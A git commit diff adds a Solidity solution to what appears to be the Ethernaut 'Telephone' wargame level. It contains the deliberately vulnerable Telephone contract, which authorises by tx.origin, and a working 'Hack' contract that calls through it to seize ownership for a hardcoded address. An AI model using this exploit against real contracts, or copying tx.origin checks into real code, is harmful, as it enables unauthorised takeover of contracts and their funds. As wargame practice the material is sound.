8ab38a0e1ca12726ffbf75fe99828869f0a85ad3
Marc Gonzalez Amores <57719399+marcgoam@users.noreply.github.com>
2023-06-28 10:16:53 +0200

    Update Telephone.sol

--- 3. Telephone/Telephone.sol
+++ 3. Telephone/Telephone.sol
@@ -1,1 +1,30 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
 
+contract Hack {
+    Telephone private immutable telephone;
+
+    constructor(address _target) {
+        telephone = Telephone(_target);
+    }
+
+    function callTelephone() external {
+        telephone.changeOwner(0x61f627aEde53cd928fB788AF7713d3212119dDC5);
+    }
+    
+}
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
